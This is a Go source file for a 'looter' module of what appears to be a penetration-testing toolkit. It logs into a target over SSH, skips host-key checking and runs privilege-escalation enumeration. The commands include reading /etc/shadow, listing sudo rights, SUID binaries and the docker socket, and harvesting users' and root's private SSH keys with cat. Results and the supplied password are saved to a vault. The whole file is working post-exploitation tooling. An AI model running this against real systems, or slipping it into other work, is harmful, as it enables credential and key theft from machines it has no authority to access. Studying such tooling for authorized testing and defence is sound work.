package looter

import (
	"fmt"
	"strings"

	"golang.org/x/crypto/ssh"

	"github.com/bryanparreira/davoid/internal/engagement"
	"github.com/bryanparreira/davoid/internal/modules/ui"
	"github.com/bryanparreira/davoid/internal/vault"
)

type finding struct {
	title string
	data  string
	sev   string
}

func Run() error {
	ui.Header("Looter — Post-Exploitation PrivEsc & Loot Collection")

	host := ui.Prompt("Target SSH host (IP:port)")
	if host == "" {
		return nil
	}
	if !strings.Contains(host, ":") {
		host += ":22"
	}

	user := ui.PromptDefault("Username", "root")
	pass := ui.Prompt("Password (leave blank for key auth)")

	fmt.Println()
	ui.Info(fmt.Sprintf("Connecting to %s@%s...", user, host))

	var authMethods []ssh.AuthMethod
	if pass != "" {
		authMethods = append(authMethods, ssh.Password(pass))
	}
	authMethods = append(authMethods, ssh.PasswordCallback(func() (string, error) {
		p := ui.Prompt("SSH key passphrase (if any)")
		return p, nil
	}))

	cfg := &ssh.ClientConfig{
		User:            user,
		Auth:            authMethods,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", host, cfg)
	if err != nil {
		ui.Fail(fmt.Sprintf("SSH connect failed: %v", err))
		return nil
	}
	defer client.Close()
	ui.Success(fmt.Sprintf("Connected to %s", host))
	eng, _ := engagement.Active()
	if eng != nil && pass != "" {
		vault.Save(eng.ID, "looter", host, user, pass, "password")
	}

	// Detect OS
	osType := "linux"
	if out, _ := runCmd(client, "uname -s"); strings.Contains(strings.ToLower(out), "darwin") {
		osType = "darwin"
	}

	fmt.Println()
	ui.Divider()
	ui.Info(fmt.Sprintf("Running PrivEsc checks (OS: %s)...", osType))
	ui.Divider()

	var findings []finding

	checks := linuxChecks()
	if osType == "darwin" {
		checks = darwinChecks()
	}

	for _, check := range checks {
		out, err := runCmd(client, check.cmd)
		if err != nil || strings.TrimSpace(out) == "" {
			continue
		}
		fmt.Printf("\n  %s  %s\n", severityBadge(check.sev), ui.Bold.Render(check.label))
		lines := strings.Split(strings.TrimSpace(out), "\n")
		for _, l := range lines {
			if l != "" {
				fmt.Printf("    %s\n", ui.Dim.Render(l))
			}
		}
		findings = append(findings, finding{title: check.label, data: out, sev: check.sev})
	}

	// SSH key harvest
	fmt.Println()
	ui.Divider()
	ui.Info("SSH Key Harvest")
	ui.Divider()
	keyPaths := []string{
		"~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.ssh/id_ecdsa",
		"/root/.ssh/id_rsa", "/root/.ssh/id_ed25519",
	}
	for _, p := range keyPaths {
		out, err := runCmd(client, "cat "+p+" 2>/dev/null")
		if err == nil && strings.Contains(out, "BEGIN") {
			fmt.Printf("  %s  %s\n", ui.Red.Render("KEY FOUND"), p)
			fmt.Println(ui.Yellow.Render(truncate(out, 200)))
			findings = append(findings, finding{title: "SSH Private Key: " + p, data: out, sev: "CRITICAL"})
		}
	}

	if eng != nil {
		for _, f := range findings {
			engagement.LogFinding(eng.ID, "looter", host, f.title, f.data, f.sev, "")
		}
		ui.Success(fmt.Sprintf("%d findings logged.", len(findings)))
	}

	fmt.Println()
	ui.PressEnter()
	return nil
}

type check struct {
	label string
	cmd   string
	sev   string
}

func linuxChecks() []check {
	return []check{
		{"Current User & ID", "id && whoami", "INFO"},
		{"SUID Binaries", "find / -perm -4000 -type f 2>/dev/null | head -20", "HIGH"},
		{"Sudo Permissions", "sudo -l 2>/dev/null", "CRITICAL"},
		{"World-Writable Directories", "find /tmp /var/tmp /dev/shm -writable -type d 2>/dev/null | head -10", "MEDIUM"},
		{"Crontab Entries", "crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null", "MEDIUM"},
		{"Network Connections", "ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null | head -20", "INFO"},
		{"Readable /etc/shadow", "cat /etc/shadow 2>/dev/null | head -5", "CRITICAL"},
		{"Interesting Files in /home", "find /home -name '*.txt' -o -name '*.conf' -o -name '*.key' 2>/dev/null | head -20", "HIGH"},
		{"Docker Group / Docker Socket", "groups; ls -la /var/run/docker.sock 2>/dev/null", "HIGH"},
		{"Installed Packages (partial)", "dpkg -l 2>/dev/null | head -20 || rpm -qa 2>/dev/null | head -20", "INFO"},
		{"OS Release", "cat /etc/os-release 2>/dev/null", "INFO"},
		{"Kernel Version", "uname -a", "INFO"},
		{"Writable PATH Directories", "echo $PATH | tr ':' '\n' | xargs -I{} find {} -writable -type d 2>/dev/null", "MEDIUM"},
	}
}

func darwinChecks() []check {
	return []check{
		{"Current User & ID", "id && whoami", "INFO"},
		{"SUID Binaries", "find / -perm -4000 -type f 2>/dev/null | head -20", "HIGH"},
		{"Sudo Permissions", "sudo -l 2>/dev/null", "CRITICAL"},
		{"Crontab Entries", "crontab -l 2>/dev/null", "MEDIUM"},
		{"Launch Agents", "ls ~/Library/LaunchAgents/ 2>/dev/null; ls /Library/LaunchAgents/ 2>/dev/null", "MEDIUM"},
		{"Network Connections", "netstat -an 2>/dev/null | head -20", "INFO"},
		{"OS Version", "sw_vers", "INFO"},
		{"Kernel Version", "uname -a", "INFO"},
	}
}

func runCmd(client *ssh.Client, cmd string) (string, error) {
	sess, err := client.NewSession()
	if err != nil {
		return "", err
	}
	defer sess.Close()
	out, err := sess.CombinedOutput(cmd)
	return string(out), err
}

func severityBadge(sev string) string {
	switch sev {
	case "CRITICAL":
		return ui.Red.Render("[CRITICAL]")
	case "HIGH":
		return ui.Yellow.Render("[HIGH]    ")
	case "MEDIUM":
		return ui.Cyan.Render("[MEDIUM]  ")
	default:
		return ui.Dim.Render("[INFO]    ")
	}
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}
